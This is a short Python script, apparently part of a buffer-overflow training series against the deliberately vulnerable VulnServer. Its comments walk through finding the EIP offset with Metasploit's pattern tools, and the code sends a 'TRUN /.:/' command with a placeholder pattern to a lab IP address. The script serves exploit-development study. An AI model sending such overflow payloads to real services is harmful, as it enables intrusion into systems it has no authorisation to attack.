#!/usr/bin/python3

'''
Carlos Enamorado
10/17/2023
Finding the Offset after fuzzing
You will need to leverage pattern_create.rb before using this script
Take the byte size found in fuzzer.py and load into '~/pattern_create.rb -l <fuzzer.py_results>'
Then run this program to find the pattern that lands in the EIP with Immunity Debugger
After all this, load the pattern you have for EIP into '~/pattern_offset.rb -l <fuzzer.py_results>  -q <EIP_pattern>'
The result is the OFFSET!
In the case of VulnServer and for the purpose of these scripts moving forward, this is '2003'
'''

import sys, socket
from time import sleep

offset = "" #offset here

try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.4.104',9999))

        payload = "TRUN /.:/" + offset

        s.send((payload.encode()))
        s.close()
except:
        print ("Error connecting to server")
        sys.exit()
